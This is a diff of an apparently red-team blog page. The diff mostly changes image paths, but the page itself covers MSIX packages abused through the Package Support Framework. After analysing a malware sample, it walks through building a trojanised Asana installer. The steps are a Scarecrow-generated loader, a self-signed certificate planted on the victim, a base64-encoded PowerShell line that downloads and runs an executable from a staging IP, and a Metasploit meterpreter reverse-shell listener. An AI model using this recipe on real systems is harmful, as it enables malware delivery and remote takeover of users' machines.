@@ -426,9 +426,7 @@
 <li>Packaging is important for delivery and distribution of applications as it enables a simplified way of deploying and installing files by packaging all the necessary components and libraries into a single package that is straightforward to use.</li>
 <li>The general MSIX file format can be deconstructed as shown:</li>
 </ul>
-<div class="center">
-<img src="/posts/2024-06-11_asd/images/msix.png"> 
-</div>
+<img src="/posts/2024-06-11_red_team06/images/msix.png"> 
 <h3 id="1-package-payload" class="relative group">1. Package Payload <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#1-package-payload" aria-label="Anchor">#</a></span></h3>
 <ul>
 <li><code>Application Files</code>: This section contains the necessary applications required for the packaged application to run. These can be EXEs, DLLs, Config files, resource files or any other type of file.</li>
@@ -449,9 +447,7 @@
 <p>It allows for extensive configuration to tailor the behaviour of applications. This customization allows resolving of specific compatibility issues without needing to modify the original code.</p>
 </li>
 </ul>
-<div class="center">
-<img src="/posts/2024-06-11_asd/images/psf.png"> 
-</div>
+<img src="/posts/2024-06-11_red_team06/images/psf.png"> 
 <ul>
 <li>
 <p>In the diagram above, we see the interaction between the PSF and the packaged application at runtime. Let&rsquo;s discuss the various components.</p>
@@ -475,9 +471,7 @@
 sample </a> from malwarebazaar.</li>
 <li>Once you&rsquo;ve downloaded and unzipped the sample, you will be presented with the following folder structure</li>
 </ul>
-<div class="center">
-<img src="/posts/2024-06-11_asd/images/unzippedmsix.png"> 
-</div>
+<img src="/posts/2024-06-11_red_team06/images/unzippedmsix.png"> 
 <ul>
 <li>
 <p>In this example, the packaged msix does not contain the target application being installed (it was probably omitted by the original poster) but, it utilizes the Package Support Framework. We can see the psflauncher and the necessary DLLs to ensure its correct functionality. So we know that the malware is going to be executing a script when it is installed on a system.</p>
@@ -496,9 +490,7 @@ sample </a> from malwarebazaar.</li>
 <ul>
 <li>I highlighted 2 important sections here. The properties and the applications section.</li>
 </ul>
-<div class="center">
-<img src="/posts/2024-06-11_asd/images/appxmanifest.png"> 
-</div>
+<img src="/posts/2024-06-11_red_team06/images/appxmanifest.png"> 
 <ul>
 <li>The <code>properties</code> section contains details identifying the application such as the name, description and the logo that the app uses.</li>
 <li>In the <code>applications</code> section, we can see the PSF executable being launched. There is also a notepad shortcut being created in the common programs folder.</li>
@@ -508,9 +500,7 @@ sample </a> from malwarebazaar.</li>
 <ul>
 <li>This is where things start to get interesting. We can see the various parameters being used in the configuration</li>
 </ul>
-<div class="center">
-<img src="/posts/2024-06-11_asd/images/configfile.png"> 
-</div>
+<img src="/posts/2024-06-11_red_team06/images/configfile.png"> 
 <ol>
 <li>The PSF executable will be launched.</li>
 <li><code>scriptExecutionMode</code> has been set to <code>RemoteSigned</code>, which allows scripts that are downloaded from the internet to run if signed by a trusted publisher.</li>
@@ -521,9 +511,7 @@ sample </a> from malwarebazaar.</li>
 <ul>
 <li>The <code>StartingScriptWrapper</code> is required by the PSF to be able to run the target script. The file below is included by default without any special modifications.</li>
 </ul>
-<div class="center">
-<img src="/posts/2024-06-11_asd/images/startingsciptwrapper.png"> 
-</div>
+<img src="/posts/2024-06-11_red_team06/images/startingsciptwrapper.png"> 
 <h3 id="usjzy" class="relative group">usJzY <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#usjzy" aria-label="Anchor">#</a></span></h3>
 <ul>
 <li>Finally, we have the target script that is being executed by PSF.</li>
@@ -551,9 +539,7 @@ sample </a> from malwarebazaar.</li>
 <ul>
 <li>First, you will need to install the <code>MSIX packaging tool</code> from the Microsoft Store</li>
 </ul>
-<div class="center">
-<img src="/posts/2024-06-11_asd/images/msixpackagingtool.png"> 
-</div>
+<img src="/posts/2024-06-11_red_team06/images/msixpackagingtool.png"> 
 <ul>
 <li>You will also need the target application being packaged. I used Asana for this example.</li>
 </ul>
@@ -567,11 +553,11 @@ sample </a> from malwarebazaar.</li>
 <li>Then generate the loader using Scarecrow</li>
 </ul>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">./scarecrow -I protection.bin -domain www.microsoft.com -encryptionmode AES 
-</span></span></code></pre></div><img src="/posts/2024-06-11_asd/images/scarecroww.png"> 
+</span></span></code></pre></div><img src="/posts/2024-06-11_red_team06/images/scarecroww.png"> 
 <ul>
 <li>Host the final loader</li>
 </ul>
-<img src="/posts/2024-06-11_asd/images/server.png"> 
+<img src="/posts/2024-06-11_red_team06/images/server.png"> 
 <h3 id="3-create-an-ssl-certificate" class="relative group">3. Create an SSL certificate <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#3-create-an-ssl-certificate" aria-label="Anchor">#</a></span></h3>
 <ul>
 <li>When running the MSIX file, Windows will check for the <code>digital signature</code> of the file to ensure it is legitimate and has not been tampered with. If you were to create an MSIX file without signing it, Windows will throw an error to you rejecting the installation process.</li>
@@ -596,42 +582,42 @@ sample </a> from malwarebazaar.</li>
 <li>Export the public key which we will install in the victim&rsquo;s computer</li>
 </ol>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Export-Certificate</span> <span class="n">-cert</span> <span class="s2">&#34;Cert:\CurrentUser\My\1BB13615AD20D8101348EA03BC077E0BBE95D792&#34;</span> <span class="n">-FilePath</span> <span class="s1">&#39;C:\Users\Saudi\cert.cer&#39;</span>
-</span></span></code></pre></div><img src="/posts/2024-06-11_asd/images/certificate.png"> 
+</span></span></code></pre></div><img src="/posts/2024-06-11_red_team06/images/certificate.png"> 
 <ul>
 <li>Since this is a self-signed SSL for testing purposes, you can install the security certificate on the victim as shown:</li>
 </ul>
-<img src="/posts/2024-06-11_asd/images/installcert.png"> 
-<img src="/posts/2024-06-11_asd/images/localmachine.png">
+<img src="/posts/2024-06-11_red_team06/images/installcert.png"> 
+<img src="/posts/2024-06-11_red_team06/images/localmachine.png">
 <ul>
 <li>Install the cert in the Trusted Root Certification Authorities</li>
 </ul>
-<img src="/posts/2024-06-11_asd/images/rootcert.png"> 
+<img src="/posts/2024-06-11_red_team06/images/rootcert.png"> 
 <h3 id="4-bundle-the-package-and-stage-our-loader" class="relative group">4. Bundle the package and stage our loader <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#4-bundle-the-package-and-stage-our-loader" aria-label="Anchor">#</a></span></h3>
 <ul>
 <li>Select the task and follow through the prompts</li>
 </ul>
-<img src="/posts/2024-06-11_asd/images/msixpackage1.png"> 
+<img src="/posts/2024-06-11_red_team06/images/msixpackage1.png"> 
 <ul>
 <li>Select the Asana setup file as the installer being packaged and select the pfx certificate we generated.</li>
 </ul>
-<img src="/posts/2024-06-11_asd/images/asanainstaller.png"> 
+<img src="/posts/2024-06-11_red_team06/images/asanainstaller.png"> 
 <ul>
 <li>You can skip the Accelerator section. The package will automatically install in the system as shown</li>
 </ul>
-<img src="/posts/2024-06-11_asd/images/installation.png">
+<img src="/posts/2024-06-11_red_team06/images/installation.png">
 <ul>
 <li>Ensure the package has an entry point as shown. We will edit the entry point in the manifest file later on to point to our psflauncher executable</li>
 </ul>
-<img src="/posts/2024-06-11_asd/images/entrypoint.png">
+<img src="/posts/2024-06-11_red_team06/images/entrypoint.png">
 <ul>
 <li>Here in the Create New Package Section, we go to the package editor to add the PSF binaries and config file to our package to give it PSF support.</li>
 </ul>
-<img src="/posts/2024-06-11_asd/images/packageeditor.png">
+<img src="/posts/2024-06-11_red_team06/images/packageeditor.png">
 <ul>
 <li>In the package editor, click on package files, right-click on the &ldquo;Package&rdquo; and add the following appropriate files</li>
 </ul>
-<img src="/posts/2024-06-11_asd/images/rightclick.png" width=1000px;>
-<img src="/posts/2024-06-11_asd/images/filestocopy.png" width=1000px;>
+<img src="/posts/2024-06-11_red_team06/images/rightclick.png" width=1000px;>
+<img src="/posts/2024-06-11_red_team06/images/filestocopy.png" width=1000px;>
 <ul>
 <li>You can edit files directly in the package editor by right-clicking and selecting edit. Let&rsquo;s modify the config file to point to our staging script called Hotfix.ps1. In this example, I enabled the powershell window to debug any errors.</li>
 </ul>
@@ -654,24 +640,24 @@ sample </a> from malwarebazaar.</li>
 </span></span></code></pre></div><ul>
 <li>Create the <code>hotfix.ps1</code> file in a different window. We will add a powershell command that pulls our loader from the staging server and executes it</li>
 </ul>
-<img src="/posts/2024-06-11_asd/images/cyberchef.png" width=1000px;>
+<img src="/posts/2024-06-11_red_team06/images/cyberchef.png" width=1000px;>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">powershell</span> <span class="n">-enc</span> <span class="s2">&#34;dwBnAGUAdAAgAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADcANQAuADEAMgA4AC8AMgA0ADoAOQAwADAAMQAvAEgAbwB0AGYAaQB4AC4AZQB4AGUAIAAtAE8AdQB0AEYAaQBsAGUAIABcAFUAcwBlAHIAcwBcAFAAdQBiAGwAaQBjAFwASABvAHQAZgBpAHgALgBlAHgAZQA7AFMAdABhAHIAdAAtAFMAbABlAGUAcAAgAC0AUwBlAGMAbwBuAGQAcwAgADUAOwBcAFUAcwBlAHIAcwBcAFAAdQBiAGwAaQBjAFwASABvAHQAZgBpAHgALgBlAHgAZQA=&#34;</span>
 </span></span></code></pre></div><ul>
 <li>Add the <code>hotfix.ps1</code> staging script</li>
 </ul>
-<img src="/posts/2024-06-11_asd/images/hotfix.png" width=1000px;>
+<img src="/posts/2024-06-11_red_team06/images/hotfix.png" width=1000px;>
 <ul>
 <li>Back to the manifest file, let&rsquo;s change the launch executable to our PSF binary so that the hotfix.ps1 can be executed post install</li>
 </ul>
-<img src="/posts/2024-06-11_asd/images/manifest.png">
+<img src="/posts/2024-06-11_red_team06/images/manifest.png">
 <ul>
 <li>In this section, take note of the Application ID defined. We will also modify the executable value</li>
 </ul>
-<img src="/posts/2024-06-11_asd/images/entrypoint1.png">
+<img src="/posts/2024-06-11_red_team06/images/entrypoint1.png">
 <ul>
 <li>Change it to point to the psf executable:</li>
 </ul>
-<img src="/posts/2024-06-11_asd/images/psflauncher.png">
+<img src="/posts/2024-06-11_red_team06/images/psflauncher.png">
 <ul>
 <li>Save and exit. Finally create your MSIX file.</li>
 </ul>
@@ -690,16 +676,16 @@ sample </a> from malwarebazaar.</li>
   <span class="dark:text-neutral-300">Ensure that the Asana application is not installed in the system</span>
 </div>
 
-<img src="/posts/2024-06-11_asd/images/asanainstaller2.png">
+<img src="/posts/2024-06-11_red_team06/images/asanainstaller2.png">
 <ul>
 <li>Setup our listener</li>
 </ul>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msfconsole -qx <span class="s2">&#34;use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 192.168.1.71;set LPORT 9001; set EXITFUNC thread; set EXITONSESSION false; exploit -j&#34;</span> 2&gt;<span class="p">&amp;</span><span class="m">1</span>
-</span></span></code></pre></div><img src="/posts/2024-06-11_asd/images/listener.png">
+</span></span></code></pre></div><img src="/posts/2024-06-11_red_team06/images/listener.png">
 <ul>
 <li>Run the MSIX installation and catch your shell</li>
 </ul>
-<img src="/posts/2024-06-11_asd/images/session1.png">
+<img src="/posts/2024-06-11_red_team06/images/session1.png">
 <ul>
 <li>Happy hacking!</li>
 </ul>
@@ -745,6 +731,28 @@ sample </a> from malwarebazaar.</li>
           
         </span>
         <span>
+          
+            <a class="flex text-right group" href="/posts/2024-06-21_red_team07/">
+              <span class="flex flex-col">
+                <span
+                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  >Analysis and Exploitation of a Parser Differential Bug</span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                    <time datetime="2024-06-11 00:00:00 &#43;0000 UTC">11 June 2024</time>
+                  
+                </span>
+              </span>
+              <span
+                class="ml-3 ltr:inline rtl:hidden text-neutral-700 dark:text-neutral group-hover:text-primary-600 dark:group-hover:text-primary-400"
+                >&rarr;</span
+              >
+              <span
+                class="mr-3 ltr:hidden rtl:inline text-neutral-700 dark:text-neutral group-hover:text-primary-600 dark:group-hover:text-primary-400"
+                >&larr;</span
+              >
+            </a>
           
         </span>
       </div>
